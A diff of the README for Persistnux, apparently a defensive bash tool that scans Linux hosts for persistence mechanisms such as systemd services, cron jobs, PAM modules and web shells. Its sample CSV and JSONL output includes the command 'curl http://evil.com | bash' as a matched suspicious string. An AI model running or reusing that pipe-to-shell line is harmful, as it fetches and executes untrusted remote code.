@@ -21,11 +21,11 @@ Persistnux is a bash-based tool designed to identify known Linux persistence mec
 ## Persistence Mechanisms Detected
 
 ### 1. Systemd Services
-- Service files in `/etc/systemd/system`, `/lib/systemd/system`, `/usr/lib/systemd/system`
+- Service files (`.service`) in `/etc/systemd/system`, `/lib/systemd/system`, `/usr/lib/systemd/system`
 - User-level systemd services
-- Timer units
-- Socket activation units
+- Filters out disabled services and services without ExecStart
 - Detects suspicious ExecStart commands
+- Verifies package integrity of executed binaries/scripts
 
 ### 2. Cron Jobs & Scheduled Tasks
 - System crontabs (`/etc/crontab`, `/etc/cron.d/*`)
@@ -41,30 +41,26 @@ Persistnux is a bash-based tool designed to identify known Linux persistence mec
 - Fish shell configurations
 - Detects malicious commands in profile files
 
-### 4. SSH Persistence
-- SSH authorized_keys for all users
-- User SSH configurations (`~/.ssh/config`)
-- System SSH daemon configuration (`/etc/ssh/sshd_config`)
-- Suspicious SSH forwarding and proxy configurations
-
-### 5. Init Scripts & RC.local
+### 4. Init Scripts & RC.local
 - `/etc/rc.local` and variants
 - SysV init scripts (`/etc/init.d`)
 - Runlevel scripts (`/etc/rc*.d`)
 - Detects suspicious download/execution commands
 
-### 6. Kernel Modules & Library Preloading
+### 5. Kernel Modules & Library Preloading
 - LD_PRELOAD configurations (`/etc/ld.so.preload`)
 - Dynamic linker configurations
 - Loaded kernel modules (enumeration)
 - Kernel module auto-load configs (`/etc/modules`, `/etc/modules-load.d`)
 
-### 7. Additional Mechanisms
+### 6. Additional Mechanisms
 - XDG autostart entries (`.config/autostart`, `/etc/xdg/autostart`)
 - System environment files (`/etc/environment`)
 - Sudoers configurations and drop-ins
-- PAM (Pluggable Authentication Modules) configurations
+- PAM (Pluggable Authentication Modules) - verifies module package integrity
 - MOTD (Message of the Day) scripts
+- Git hooks and credential helpers
+- Web shells in common web directories
 
 ## Installation
 
@@ -134,15 +130,36 @@ By default, Persistnux creates an output directory `./persistnux_output/` contai
 ### CSV Format
 
 ```csv
-timestamp,category,subcategory,persistence_type,location,description,confidence,sha256,metadata,additional_info
-2026-01-23T10:30:00Z,Systemd,Service,systemd_service,/etc/systemd/system/example.service,"Service: example.service | Status: enabled | ExecStart: /usr/bin/example",HIGH,abc123...,mode:644|owner:root:root|size:256|...,enabled=enabled
+timestamp,hostname,category,confidence,file_path,file_hash,file_owner,file_permissions,file_age_days,package_status,command,enabled_status,description,matched_pattern,matched_string
+2026-01-23T10:30:00Z,webserver01,Systemd Service,HIGH,/etc/systemd/system/example.service,abc123...,root:root,644,3,unmanaged,/usr/bin/example,enabled,example.service,suspicious_script_content,"curl http://evil.com | bash"
 ```
 
 ### JSONL Format
 
 ```json
-{"timestamp":"2026-01-23T10:30:00Z","hostname":"webserver01","category":"Systemd","subcategory":"Service","persistence_type":"systemd_service","location":"/etc/systemd/system/example.service","description":"Service: example.service | Status: enabled | ExecStart: /usr/bin/example","confidence":"HIGH","sha256":"abc123...","metadata":"mode:644|owner:root:root|size:256|...","additional_info":"enabled=enabled"}
+{
+  "timestamp": "2026-01-23T10:30:00Z",
+  "hostname": "webserver01",
+  "category": "Systemd Service",
+  "confidence": "HIGH",
+  "file_path": "/etc/systemd/system/example.service",
+  "file_hash": "abc123...",
+  "file_owner": "root:root",
+  "file_permissions": "644",
+  "file_age_days": "3",
+  "package_status": "unmanaged",
+  "command": "/usr/bin/example",
+  "enabled_status": "enabled",
+  "description": "example.service",
+  "matched_pattern": "suspicious_script_content",
+  "matched_string": "curl http://evil.com | bash"
+}
 ```
+
+### Key Output Fields
+
+- **matched_pattern**: The detection pattern that triggered the finding (e.g., `suspicious_script_content`, `modified_package`, `unmanaged_binary`)
+- **matched_string**: The actual suspicious content found (full line, not just keyword)
 
 ## Confidence Scoring
 
